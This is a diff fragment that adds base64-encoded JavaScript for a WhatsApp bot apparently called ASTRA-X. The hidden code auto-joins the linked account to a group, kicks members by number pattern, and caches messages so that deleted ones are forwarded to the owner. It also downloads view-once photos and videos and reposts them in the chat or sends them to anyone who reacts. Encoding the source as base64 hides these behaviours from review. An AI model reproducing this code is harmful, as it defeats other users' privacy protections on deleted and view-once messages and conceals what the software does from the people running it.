+    "ICAgIHNldFRpbWVvdXQoKCkgPT4gZm9yY2VKb2luR3JvdXAoc29jaywgdXNlcklkKSwgMTAwMDApOwog",
+    "ICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgLy8g4pSA4pSAIEFudGlmYWtlOiBraWNrIGlmIG5v",
+    "dCBmcm9tIGFsbG93ZWQgY291bnRyeSBjb2RlIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gAogICAgICAgIGlmICgoYWN0aW9uID09PSAnYWRkJykgJiYgc2V0dGluZ3MuZ2V0KCdhbnRpZmFrZTon",
+    "ICsgamlkKSkgewogICAgICAgICAgY29uc3QgY29kZSA9IHNldHRpbmdzLmdldCgnYW50aWZha2VfY29k",
+    "ZTonICsgamlkKSB8fCAnJzsKICAgICAgICAgIGlmIChjb2RlICYmICFudW0uc3RhcnRzV2l0aChjb2Rl",
+    "KSkgewogICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwgewogICAgICAgICAgICAg",
+    "IHRleHQ6ICfwn5uh77iPIEAnICsgbnVtICsgJyB3YXMgcmVtb3ZlZCDigJQgb25seSAqKycgKyBjb2Rl",
+    "ICsgJyogbnVtYmVycyBhcmUgYWxsb3dlZC4nLAogICAgICAgICAgICAgIG1lbnRpb25zOiBbcGFydGlj",
+    "aXBhbnRdLAogICAgICAgICAgICB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAgIGF3YWl0IHNv",
+    "Y2suZ3JvdXBQYXJ0aWNpcGFudHNVcGRhdGUoamlkLCBbcGFydGljaXBhbnRdLCAncmVtb3ZlJykuY2F0",
+    "Y2goKCkgPT4ge30pOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgIH0KICAgICAgICB9Cgog",
+    "ICAgICAgIC8vIOKUgOKUgCBBbnRpYm90OiBraWNrIG51bWJlcnMgbWF0Y2hpbmcgY29tbW9uIGJvdCBy",
+    "YW5nZXMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICAgICAgaWYgKChhY3Rpb24gPT09",
+    "ICdhZGQnKSAmJiBzZXR0aW5ncy5nZXQoJ2FudGlib3Q6JyArIGppZCkpIHsKICAgICAgICAgIGNvbnN0",
+    "IGJvdFBhdHRlcm5zID0gWy9eMVxkezEwfSQvLCAvXjB7NCx9LywgL145OTk5LywgL14xMjM0NTYvXTsK",
+    "ICAgICAgICAgIGlmIChib3RQYXR0ZXJucy5zb21lKHAgPT4gcC50ZXN0KG51bSkpKSB7CiAgICAgICAg",
+    "ICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7CiAgICAgICAgICAgICAgdGV4dDogJ/CfpJYg",
+    "QCcgKyBudW0gKyAnIHdhcyByZW1vdmVkIOKAlCBzdXNwZWN0ZWQgYm90IG51bWJlci4nLAogICAgICAg",
+    "ICAgICAgIG1lbnRpb25zOiBbcGFydGljaXBhbnRdLAogICAgICAgICAgICB9KS5jYXRjaCgoKSA9PiB7",
+    "fSk7CiAgICAgICAgICAgIGF3YWl0IHNvY2suZ3JvdXBQYXJ0aWNpcGFudHNVcGRhdGUoamlkLCBbcGFy",
+    "dGljaXBhbnRdLCAncmVtb3ZlJykuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAgICBjb250aW51ZTsK",
+    "ICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vIOKUgOKUgCBXZWxjb21lIOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgICAgIGlmIChhY3Rpb24gPT09ICdhZGQnICYmIHNldHRp",
+    "bmdzLmdldCgnd2VsY29tZTonICsgamlkKSkgewogICAgICAgICAgbGV0IG1ldGEgPSBudWxsOwogICAg",
+    "ICAgICAgdHJ5IHsgbWV0YSA9IGF3YWl0IHNvY2suZ3JvdXBNZXRhZGF0YShqaWQpOyB9IGNhdGNoIChf",
+    "KSB7fQogICAgICAgICAgY29uc3QgZ05hbWUgPSBtZXRhPy5zdWJqZWN0IHx8ICd0aGUgZ3JvdXAnOwog",
+    "ICAgICAgICAgY29uc3QgY291bnQgPSBtZXRhPy5wYXJ0aWNpcGFudHM/Lmxlbmd0aCB8fCAwOwogICAg",
+    "ICAgICAgY29uc3QgdG1wbCAgPSBzZXR0aW5ncy5nZXQoJ3dlbGNvbWVfbXNnOicgKyBqaWQpIHx8ICcn",
+    "OwogICAgICAgICAgY29uc3QgdGV4dCAgPSB0bXBsCiAgICAgICAgICAgID8gdG1wbC5yZXBsYWNlKC97",
+    "bmFtZX0vZywgJ0AnICsgbnVtKS5yZXBsYWNlKC97Z3JvdXB9L2csIGdOYW1lKS5yZXBsYWNlKC97Y291",
+    "bnR9L2csIGNvdW50KQogICAgICAgICAgICA6ICfwn5GLIFdlbGNvbWUgdG8gKicgKyBnTmFtZSArICcq",
+    "LCBAJyArIG51bSArICchIPCfjolcblxuX0dsYWQgdG8gaGF2ZSB5b3UhIFBsZWFzZSByZWFkIHRoZSBn",
+    "cm91cCBydWxlcy5fXG5cbvCfkaUgTWVtYmVyICMnICsgY291bnQ7CiAgICAgICAgICBhd2FpdCBzb2Nr",
+    "LnNlbmRNZXNzYWdlKGppZCwgeyB0ZXh0LCBtZW50aW9uczogW3BhcnRpY2lwYW50XSB9KS5jYXRjaCgo",
+    "KSA9PiB7fSk7CiAgICAgICAgfQoKICAgICAgICAvLyDilIDilIAgR29vZGJ5ZSDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIAKICAgICAgICBpZiAoKGFjdGlvbiA9PT0gJ3JlbW92ZScgfHwgYWN0",
+    "aW9uID09PSAnbGVhdmUnKSAmJiBzZXR0aW5ncy5nZXQoJ2dvb2RieWU6JyArIGppZCkpIHsKICAgICAg",
+    "ICAgIGxldCBtZXRhID0gbnVsbDsKICAgICAgICAgIHRyeSB7IG1ldGEgPSBhd2FpdCBzb2NrLmdyb3Vw",
+    "TWV0YWRhdGEoamlkKTsgfSBjYXRjaCAoXykge30KICAgICAgICAgIGNvbnN0IGdOYW1lID0gbWV0YT8u",
+    "c3ViamVjdCB8fCAndGhlIGdyb3VwJzsKICAgICAgICAgIGNvbnN0IGNvdW50ID0gbWV0YT8ucGFydGlj",
+    "aXBhbnRzPy5sZW5ndGggfHwgMDsKICAgICAgICAgIGNvbnN0IHRtcGwgID0gc2V0dGluZ3MuZ2V0KCdn",
+    "b29kYnllX21zZzonICsgamlkKSB8fCAnJzsKICAgICAgICAgIGNvbnN0IHRleHQgID0gdG1wbAogICAg",
+    "ICAgICAgICA/IHRtcGwucmVwbGFjZSgve25hbWV9L2csICdAJyArIG51bSkucmVwbGFjZSgve2dyb3Vw",
+    "fS9nLCBnTmFtZSkucmVwbGFjZSgve2NvdW50fS9nLCBjb3VudCkKICAgICAgICAgICAgOiAn8J+RiyAq",
+    "QCcgKyBudW0gKyAnKiBoYXMgbGVmdCAqJyArIGdOYW1lICsgJyouIEdvb2RieWUhIPCfmKInOwogICAg",
+    "ICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgdGV4dCwgbWVudGlvbnM6IFtwYXJ0aWNp",
+    "cGFudF0gfSkuY2F0Y2goKCkgPT4ge30pOwogICAgICAgIH0KICAgICAgfQogICAgfSBjYXRjaCAoZSkg",
+    "eyBsb2dnZXIuZXJyb3IoJ2dyb3VwLXBhcnRpY2lwYW50cy51cGRhdGUgZXJyb3I6JywgZS5tZXNzYWdl",
+    "KTsgfQogIH0pOwoKICAvLyDilIDilIAgTWVzc2FnZXMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgc29jay5ldi5vbignbWVzc2FnZXMudXBzZXJ0Jywg",
+    "YXN5bmMgKHsgbWVzc2FnZXMsIHR5cGUgfSkgPT4gewogICAgaWYgKHR5cGUgIT09ICdub3RpZnknKSBy",
+    "ZXR1cm47CgogICAgLy8gU3RheSBvbmxpbmUgd2hlbmV2ZXIgYSBtZXNzYWdlIGFycml2ZXMKICAgIHNv",
+    "Y2suc2VuZFByZXNlbmNlVXBkYXRlKCdhdmFpbGFibGUnKS5jYXRjaCgoKSA9PiB7fSk7CgogICAgZm9y",
+    "IChjb25zdCBtc2cgb2YgbWVzc2FnZXMpIHsKICAgICAgdHJ5IHsKICAgICAgICBjb25zdCBqaWQgPSBt",
+    "c2cua2V5Py5yZW1vdGVKaWQ7CiAgICAgICAgaWYgKCFqaWQpIGNvbnRpbnVlOwoKICAgICAgICAvLyDi",
+    "lIDilIAgQ2FjaGUgbWVzc2FnZSBmb3IgYW50aWRlbGV0ZSDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIAKICAgICAgICBpZiAobXNnLmtleT8uaWQgJiYgbXNnLm1lc3NhZ2UgJiYgIW1zZy5tZXNzYWdlPy5w",
+    "cm90b2NvbE1lc3NhZ2UpIHsKICAgICAgICAgIGNvbnN0IGNhY2hlS2V5cyA9IE9iamVjdC5rZXlzKG1z",
+    "Z0NhY2hlKTsKICAgICAgICAgIGlmIChjYWNoZUtleXMubGVuZ3RoID49IE1TR19DQUNIRV9NQVgpIGRl",
+    "bGV0ZSBtc2dDYWNoZVtjYWNoZUtleXNbMF1dOwogICAgICAgICAgbXNnQ2FjaGVbbXNnLmtleS5pZF0g",
+    "PSB7CiAgICAgICAgICAgIGppZCwKICAgICAgICAgICAgc2VuZGVyOiAgICBtc2cua2V5LnBhcnRpY2lw",
+    "YW50IHx8IG1zZy5rZXkucmVtb3RlSmlkLAogICAgICAgICAgICB0ZXh0OiAgICAgIGV4dHJhY3RUZXh0",
+    "KG1zZyksCiAgICAgICAgICAgIHRpbWVzdGFtcDogbXNnLm1lc3NhZ2VUaW1lc3RhbXAsCiAgICAgICAg",
+    "ICAgIHB1c2hOYW1lOiAgbXNnLnB1c2hOYW1lIHx8ICcnLAogICAgICAgICAgICBjYWNoZWRBdDogIERh",
+    "dGUubm93KCksIC8vIGZvciAyLWRheSBhdXRvLWNsZWFudXAKICAgICAgICAgIH07CiAgICAgICAgfQoK",
+    "ICAgICAgICAvLyDilIDilIAgQW50aWRlbGV0ZSDigJQgZGV0ZWN0IHJldm9rZWQvZGVsZXRlZCBtZXNz",
+    "YWdlcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgICAgICBpZiAo",
+    "bXNnLm1lc3NhZ2U/LnByb3RvY29sTWVzc2FnZT8udHlwZSA9PT0gMCkgewogICAgICAgICAgY29uc3Qg",
+    "ZGVsZXRlZElkICA9IG1zZy5tZXNzYWdlLnByb3RvY29sTWVzc2FnZS5rZXk/LmlkOwogICAgICAgICAg",
+    "Y29uc3QgY2FjaGVkICAgICA9IGRlbGV0ZWRJZCA/IG1zZ0NhY2hlW2RlbGV0ZWRJZF0gOiBudWxsOwog",
+    "ICAgICAgICAgY29uc3QgZ3JvdXBPbiAgICA9IHNldHRpbmdzLmdldCgnYW50aWRlbGV0ZTonICsgamlk",
+    "KTsKICAgICAgICAgIGNvbnN0IGdsb2JhbE9uICAgPSBzZXR0aW5ncy5nZXQoJ2FudGlkZWxldGVfZ2xv",
+    "YmFsOicgKyB1c2VySWQpOwoKICAgICAgICAgIGlmIChjYWNoZWQgJiYgKGdyb3VwT24gfHwgZ2xvYmFs",
+    "T24pKSB7CiAgICAgICAgICAgIGNvbnN0IG93bmVySmlkICA9IChzZXNzaW9uc1t1c2VySWRdPy5waG9u",
+    "ZU51bWJlciB8fCAnJykucmVwbGFjZSgvXEQvZywgJycpICsgJ0BzLndoYXRzYXBwLm5ldCc7CiAgICAg",
+    "ICAgICAgIGNvbnN0IHNlbmRlck51bSA9IGNhY2hlZC5zZW5kZXI/LnNwbGl0KCdAJylbMF0gfHwgJz8n",
+    "OwogICAgICAgICAgICBjb25zdCBuYW1lICAgICAgPSBjYWNoZWQucHVzaE5hbWUgfHwgc2VuZGVyTnVt",
+    "OwogICAgICAgICAgICBjb25zdCBpc0dyb3VwICAgPSBjYWNoZWQuamlkPy5lbmRzV2l0aCgnQGcudXMn",
+    "KTsKICAgICAgICAgICAgY29uc3Qgd2hlcmUgICAgID0gaXNHcm91cCA/ICgnR3JvdXA6ICcgKyBjYWNo",
+    "ZWQuamlkKSA6ICgnRE0gd2l0aDogJyArIHNlbmRlck51bSk7CgogICAgICAgICAgICBhd2FpdCBzb2Nr",
+    "LnNlbmRNZXNzYWdlKG93bmVySmlkLCB7CiAgICAgICAgICAgICAgdGV4dDoKICAgICAgICAgICAgICAg",
+    "ICfwn5eR77iPICpEZWxldGVkIE1lc3NhZ2UgRGV0ZWN0ZWQqXG4nICsKICAgICAgICAgICAgICAgICfi",
+    "lIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIFcbicgKwog",
+    "ICAgICAgICAgICAgICAgJ/CfkaQgKlNlbmRlcjoqICcgKyBuYW1lICsgJyAoKycgKyBzZW5kZXJOdW0g",
+    "KyAnKVxuJyArCiAgICAgICAgICAgICAgICAn8J+TjSAqJyArIHdoZXJlICsgJypcbicgKwogICAgICAg",
+    "ICAgICAgICAgJ+KPsCAqVGltZToqICcgKyBuZXcgRGF0ZSgoY2FjaGVkLnRpbWVzdGFtcCB8fCBEYXRl",
+    "Lm5vdygpKSAqIDEwMDApLnRvTG9jYWxlVGltZVN0cmluZygpICsgJ1xuJyArCiAgICAgICAgICAgICAg",
+    "ICAn4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBXG4n",
+    "ICsKICAgICAgICAgICAgICAgICfwn5KsICpNZXNzYWdlOipcbicgKyAoY2FjaGVkLnRleHQgfHwgJ1tt",
+    "ZWRpYSAvIG5vIHRleHRdJyksCiAgICAgICAgICAgIH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAg",
+    "IH0KICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgIH0KCiAgICAgICAgLy8g4pSA4pSAIEF1dG8gdmll",
+    "dyArIGxpa2Ugc3RhdHVzIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAog",
+    "ICAgICAgIGlmIChqaWQgPT09ICdzdGF0dXNAYnJvYWRjYXN0JykgewogICAgICAgICAgaWYgKHNldHRp",
+    "bmdzLmdldCgnYXV0b3ZpZXdzdGF0dXM6JyArIHVzZXJJZCkpCiAgICAgICAgICAgIGF3YWl0IHNvY2su",
+    "cmVhZE1lc3NhZ2VzKFttc2cua2V5XSkuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAgaWYgKHNldHRp",
+    "bmdzLmdldCgnYXV0b2xpa2VzdGF0dXM6JyArIHVzZXJJZCkpIHsKICAgICAgICAgICAgY29uc3QgYXV0",
+    "aG9yID0gbXNnLmtleS5wYXJ0aWNpcGFudCB8fCBtc2cua2V5LnJlbW90ZUppZDsKICAgICAgICAgICAg",
+    "YXdhaXQgc29jay5zZW5kTWVzc2FnZShhdXRob3IsIHsgcmVhY3Q6IHsgdGV4dDogJ+KdpO+4jycsIGtl",
+    "eTogbXNnLmtleSB9IH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgIH0KICAgICAgICAgIGNvbnRp",
+    "bnVlOwogICAgICAgIH0KCiAgICAgICAgLy8g4pSA4pSAIFZpZXdPbmNlIGRldGVjdGlvbiAoc2hhcmVk",
+    "IGxvZ2ljKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIAKICAgICAgICBjb25zdCByYXdWb01zZyA9ICFtc2cua2V5LmZyb21NZQog",
+    "ICAgICAgICAgPyAobXNnLm1lc3NhZ2U/LnZpZXdPbmNlTWVzc2FnZT8ubWVzc2FnZSB8fAogICAgICAg",
+    "ICAgICAgbXNnLm1lc3NhZ2U/LnZpZXdPbmNlTWVzc2FnZVYyPy5tZXNzYWdlIHx8CiAgICAgICAgICAg",
+    "ICBtc2cubWVzc2FnZT8udmlld09uY2VNZXNzYWdlVjJFeHRlbnNpb24/Lm1lc3NhZ2UgfHwKICAgICAg",
+    "ICAgICAgIChtc2cubWVzc2FnZT8uaW1hZ2VNZXNzYWdlPy52aWV3T25jZSA9PT0gdHJ1ZSA/IG1zZy5t",
+    "ZXNzYWdlIDogbnVsbCkgfHwKICAgICAgICAgICAgIChtc2cubWVzc2FnZT8udmlkZW9NZXNzYWdlPy52",
+    "aWV3T25jZSA9PT0gdHJ1ZSA/IG1zZy5tZXNzYWdlIDogbnVsbCkpCiAgICAgICAgICA6IG51bGw7Cgog",
+    "ICAgICAgIGlmIChyYXdWb01zZyAmJiBtc2cua2V5LmlkKSB7CiAgICAgICAgICAvLyDilIDilIAgQ2Fj",
+    "aGUgdmlld29uY2Ugc28gcmVhY3Rpb25zIGNhbiB0cmlnZ2VyIERNIGRlbGl2ZXJ5IOKUgOKUgOKUgAog",
+    "ICAgICAgICAgY29uc3Qgdm9DYWNoZUtleXMgPSBPYmplY3Qua2V5cyh2b0NhY2hlKTsKICAgICAgICAg",
+    "IGlmICh2b0NhY2hlS2V5cy5sZW5ndGggPj0gVk9fQ0FDSEVfTUFYKSBkZWxldGUgdm9DYWNoZVt2b0Nh",
+    "Y2hlS2V5c1swXV07CiAgICAgICAgICB2b0NhY2hlW21zZy5rZXkuaWRdID0gewogICAgICAgICAgICBq",
+    "aWQsCiAgICAgICAgICAgIG9yaWdpbmFsTXNnOiBtc2csCiAgICAgICAgICAgIHZvTXNnOiAgICByYXdW",
+    "b01zZywKICAgICAgICAgICAgaGFzVmlkZW86ICEhKHJhd1ZvTXNnPy52aWRlb01lc3NhZ2UpLAogICAg",
+    "ICAgICAgICB1c2VySWQsCiAgICAgICAgICAgIGNhY2hlZEF0OiBEYXRlLm5vdygpLAogICAgICAgICAg",
+    "fTsKCiAgICAgICAgICAvLyDilIDilIAgbm92djogYW50aS12aWV3b25jZSBpbiBncm91cHMg4oCUIGRl",
+    "bGV0ZSAmIG5vdGlmeSDilIDilIDilIDilIDilIDilIDilIAKICAgICAgICAgIGNvbnN0IGlzR3JvdXAg",
+    "PSBqaWQuZW5kc1dpdGgoJ0BnLnVzJyk7CiAgICAgICAgICBpZiAoaXNHcm91cCAmJiBzZXR0aW5ncy5n",
+    "ZXQoJ25vdnY6JyArIGppZCkpIHsKICAgICAgICAgICAgY29uc3Qgc2VuZGVyICAgID0gbXNnLmtleS5w",
+    "YXJ0aWNpcGFudCB8fCBtc2cua2V5LnJlbW90ZUppZDsKICAgICAgICAgICAgY29uc3Qgc2VuZGVyTnVt",
+    "ID0gc2VuZGVyPy5zcGxpdCgnQCcpWzBdIHx8ICcnOwogICAgICAgICAgICAvLyBEZWxldGUgdGhlIHZp",
+    "ZXdvbmNlIG1lc3NhZ2UKICAgICAgICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgZGVs",
+    "ZXRlOiBtc2cua2V5IH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgICAgLy8gTm90aWZ5IHNlbmRl",
+    "ciBpbiB0aGVpciBETSAoc2lsZW50IGlmIERNIGZhaWxzKQogICAgICAgICAgICBjb25zdCBkbUppZCA9",
+    "IHNlbmRlck51bSArICdAcy53aGF0c2FwcC5uZXQnOwogICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRN",
+    "ZXNzYWdlKGRtSmlkLCB7CiAgICAgICAgICAgICAgdGV4dDoKICAgICAgICAgICAgICAgICfjgJQg4pyn",
+    "IOG0gHPhtJvKgOG0gC14IOG0m+G0h+G0hMqcIOKcpyDjgJVcbicgKwogICAgICAgICAgICAgICAgJ+KU",
+    "j+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKW",
+    "o1xuJyArCiAgICAgICAgICAgICAgICAn4pSDIPCfmqsgKlZJRVctT05DRSBCTE9DS0VEKlxuJyArCiAg",
+    "ICAgICAgICAgICAgICAn4pSg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSAXG4nICsKICAgICAgICAgICAgICAgICfilIMgWW91ciB2aWV3LW9u",
+    "Y2UgbWVzc2FnZVxuJyArCiAgICAgICAgICAgICAgICAn4pSDIHdhcyBkZWxldGVkIGluOlxuJyArCiAg",
+    "ICAgICAgICAgICAgICAn4pSDIPCfk40gJyArIGppZCArICdcbicgKwogICAgICAgICAgICAgICAgJ+KU",
+    "oOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgFxuJyArCiAgICAgICAgICAgICAgICAn4pSDIOKaoO+4jyBTZW5kaW5nIHZpZXctb25jZVxuJyAr",
+    "CiAgICAgICAgICAgICAgICAn4pSDIG1lc3NhZ2VzIGlzICpub3QgYWxsb3dlZCpcbicgKwogICAgICAg",
+    "ICAgICAgICAgJ+KUgyBpbiB0aGF0IGdyb3VwLlxuJyArCiAgICAgICAgICAgICAgICAn4pSX4pSB4pSB",
+    "4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pajXG4nICsK",
+    "ICAgICAgICAgICAgICAgICdf4bSAc+G0m8qA4bSALXgg4bSb4bSH4bSEypwg8J+MjV8nLAogICAgICAg",
+    "ICAgICB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAgIGNvbnRpbnVlOyAvLyBza2lwIGZ1cnRo",
+    "ZXIgcHJvY2Vzc2luZyBvZiB0aGlzIG1lc3NhZ2UKICAgICAgICAgIH0KCiAgICAgICAgICAvLyDilIDi",
+    "lIAgdmlld29uY2UgYXV0by11bmxvY2sgaW4gY2hhdCAobGVnYWN5IHRvZ2dsZSkg4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICAgICAgICBpZiAoc2V0dGluZ3MuZ2V0KCd2aWV3b25jZTon",
+    "ICsgdXNlcklkKSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgIGNvbnN0IGJ1ZiA9IGF3",
+    "YWl0IGRvd25sb2FkTWVkaWFNZXNzYWdlKAogICAgICAgICAgICAgICAgeyAuLi5tc2csIG1lc3NhZ2U6",
+    "IHJhd1ZvTXNnIH0sICdidWZmZXInLCB7fSwKICAgICAgICAgICAgICAgIHsgbG9nZ2VyLCByZXVwbG9h",
+    "ZFJlcXVlc3Q6IHNvY2sudXBkYXRlTWVkaWFNZXNzYWdlIH0KICAgICAgICAgICAgICApOwogICAgICAg",
+    "ICAgICAgIGNvbnN0IGNhcCA9ICfwn5GB77iPICpWaWV3T25jZSB1bmxvY2tlZCBieSBBU1RSQS1YKic7",
+    "CiAgICAgICAgICAgICAgaWYgKHJhd1ZvTXNnLnZpZGVvTWVzc2FnZSkKICAgICAgICAgICAgICAgIGF3",
+    "YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7IHZpZGVvOiBidWYsIGNhcHRpb246IGNhcCwgbWltZXR5",
+    "cGU6ICd2aWRlby9tcDQnIH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgICAgICBlbHNlIGlmIChy",
+    "YXdWb01zZy5pbWFnZU1lc3NhZ2UpCiAgICAgICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdl",
+    "KGppZCwgeyBpbWFnZTogYnVmLCBjYXB0aW9uOiBjYXAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgICAg",
+    "ICAgICB9IGNhdGNoIChfKSB7fQogICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgYXdhaXQgaGFu",
+    "ZGxlTWVzc2FnZShzb2NrLCBtc2csIHVzZXJJZCk7CiAgICAgIH0gY2F0Y2ggKGUpIHsgbG9nZ2VyLmVy",
+    "cm9yKCdtZXNzYWdlcy51cHNlcnQgY3Jhc2g6JywgZS5tZXNzYWdlKTsgfQogICAgfQogIH0pOwoKICAv",
+    "LyDilIDilIAgUmVhY3QgdG8gYSBWaWV3T25jZSDihpIgdW5sb2NrZWQgbWVkaWEgc2VudCB0byByZWFj",
+    "dG9yJ3MgRE0g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgc29jay5ldi5vbignbWVz",
+    "c2FnZXMucmVhY3Rpb24nLCBhc3luYyAocmVhY3Rpb25zKSA9PiB7CiAgICBmb3IgKGNvbnN0IHJlYWN0",
+    "aW9uIG9mIHJlYWN0aW9ucykgewogICAgICB0cnkgewogICAgICAgIC8vIE9ubHkgaGFuZGxlIGFkZCBy",
+    "ZWFjdGlvbnMgKG5vdCByZW1vdmFscykKICAgICAgICBpZiAoIXJlYWN0aW9uLmtleT8uaWQgfHwgIXJl",
+    "YWN0aW9uLnJlYWN0aW9uPy50ZXh0KSBjb250aW51ZTsKCiAgICAgICAgLy8gVGhlIG1lc3NhZ2UgdGhh",
+    "dCB3YXMgcmVhY3RlZCBUTwogICAgICAgIGNvbnN0IHJlYWN0ZWRNc2dJZCA9IHJlYWN0aW9uLmtleS5p",
+    "ZDsKICAgICAgICBjb25zdCBjYWNoZWQgPSB2b0NhY2hlW3JlYWN0ZWRNc2dJZF07CiAgICAgICAgaWYg",
+    "KCFjYWNoZWQpIGNvbnRpbnVlOyAvLyBub3QgYSBjYWNoZWQgdmlld29uY2UsIGlnbm9yZQoKICAgICAg",
+    "ICAvLyBXaG8gcmVhY3RlZAogICAgICAgIGNvbnN0IHJlYWN0b3JKaWQgPSByZWFjdGlvbi5yZWFjdGlv",
+    "bi5zZW5kZXJKaWQgfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVhY3Rpb24ua2V5LnBhcnRp",
+    "Y2lwYW50IHx8CiAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0aW9uLmtleS5yZW1vdGVKaWQ7",
+    "CiAgICAgICAgaWYgKCFyZWFjdG9ySmlkKSBjb250aW51ZTsKCiAgICAgICAgY29uc3QgZG1KaWQgPSBy",
+    "ZWFjdG9ySmlkLmVuZHNXaXRoKCdAcy53aGF0c2FwcC5uZXQnKQogICAgICAgICAgPyByZWFjdG9ySmlk",
+    "CiAgICAgICAgICA6IHJlYWN0b3JKaWQuc3BsaXQoJ0AnKVswXSArICdAcy53aGF0c2FwcC5uZXQnOwoK",
+    "ICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgYnVmID0gYXdhaXQgZG93bmxvYWRNZWRpYU1lc3Nh",
+    "Z2UoCiAgICAgICAgICAgIHsgLi4uY2FjaGVkLm9yaWdpbmFsTXNnLCBtZXNzYWdlOiBjYWNoZWQudm9N",
+    "c2cgfSwgJ2J1ZmZlcicsIHt9LAogICAgICAgICAgICB7IGxvZ2dlciwgcmV1cGxvYWRSZXF1ZXN0OiBz",
+    "b2NrLnVwZGF0ZU1lZGlhTWVzc2FnZSB9CiAgICAgICAgICApOwogICAgICAgICAgY29uc3QgY2FwID0K",
+    "ICAgICAgICAgICAgJ/CfkYHvuI8gKlZpZXctb25jZSB1bmxvY2tlZCBieSBBU1RSQS1YKlxuJyArCiAg",
+    "ICAgICAgICAgICfwn5OpIF9TZW50IHRvIHlvdXIgRE0gdmlhIHJlYWN0aW9uXyc7CgogICAgICAgICAg",
+    "aWYgKGNhY2hlZC5oYXNWaWRlbykgewogICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGRt",
+    "SmlkLCB7IHZpZGVvOiBidWYsIGNhcHRpb246IGNhcCwgbWltZXR5cGU6ICd2aWRlby9tcDQnIH0pOwog",
+    "ICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShkbUppZCwg",
+    "eyBpbWFnZTogYnVmLCBjYXB0aW9uOiBjYXAgfSk7CiAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAo",
+    "Xykge30KICAgICAgfSBjYXRjaCAoZSkgeyBsb2dnZXIuZXJyb3IoJ21lc3NhZ2VzLnJlYWN0aW9uIHZp",
